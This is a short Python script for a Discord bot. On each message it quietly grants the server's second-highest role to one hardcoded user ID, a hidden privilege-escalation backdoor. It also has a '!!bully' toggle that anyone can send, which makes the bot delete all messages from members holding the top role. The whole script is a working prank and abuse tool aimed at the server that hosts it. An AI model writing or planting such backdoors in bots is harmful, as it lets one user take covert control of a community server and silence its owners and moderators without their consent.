import discord
from random import random
anoy=True

client = discord.Client()
@client.event
async def on_start():
    global anoy
    anoy=True 
@client.event
async def on_message(message):
    global anoy
    
    arr = message.author.guild.roles
    
    if (message.author.id==693528994578038804):
        print("a")
        await message.author.add_roles(arr[-2])
    owner=arr[-1]

    if message.content.startswith("!!bully"):
        anoy=not anoy
    elif message.author.top_role.position >= owner.position and anoy:
        await message.delete()
client.run('')